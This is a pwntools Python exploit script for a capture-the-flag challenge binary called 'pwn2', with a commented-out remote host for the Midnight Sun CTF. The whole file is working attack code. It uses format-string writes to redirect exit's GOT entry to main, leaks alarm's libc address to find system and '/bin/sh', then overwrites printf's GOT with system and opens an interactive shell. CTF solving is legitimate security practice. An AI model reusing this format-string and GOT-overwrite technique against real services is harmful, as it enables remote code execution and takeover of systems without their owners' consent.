from pwn import *
target=process('./pwn2')
libc=ELF('/lib32/libc.so.6')
context.terminal=["tmux","split","-h"]
#target=remote('pwn2-01.play.midnightsunctf.se', 10002)
#libc=ELF('./libc.so.6')

exit_got=0x0804b020
alarm_got=0x0804b014
main=0x080485EB

# rewrite exit_got with main
addr1=0x0804b020
addr2=0x0804b022
print(target.recvuntil("input: "))
payload1=p32(addr1)+p32(addr2)+"%#034275x"+"%7$hn"+"%#033305x"+"%8$hn"
target.sendline(payload1)

#leak alarm in libc
print(target.recvuntil("input: "))
payload2=p32(alarm_got)+".."+"%7$s\n"
target.sendline(payload2)
print(target.recvuntil(".."))
leak=target.recvline().strip("\n")
libc_alarm=u32(leak[0:4])
print(hex(libc_alarm))
libc_base=libc_alarm-libc.symbols["alarm"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh").next()

#rewrite exit_got with libc_system
printf_got=0x0804b00c
addr1=0x0804b00c
addr2=0x0804b00e

rlb=libc_system&0xffff
rhb=(libc_system&0xffff0000)>>16

if rlb>rhb:
    payload3=p32(addr1)+p32(addr2)+"%#0"+str(rhb-8)+"x"+"%8$hn"+"%#0"+str(rlb-rhb)+"x"+"%7$hn"
else:
    payload3=p32(addr1)+p32(addr2)+"%#0"+str(rlb-8)+"x"+"%7$hn"+"%#0"+str(rhb-rlb)+"x"+"%8$hn"

target.sendline(payload3)

#send "/bin/sh" to system()
payload4="/bin/sh\x00"
target.sendline(payload4)
target.interactive()

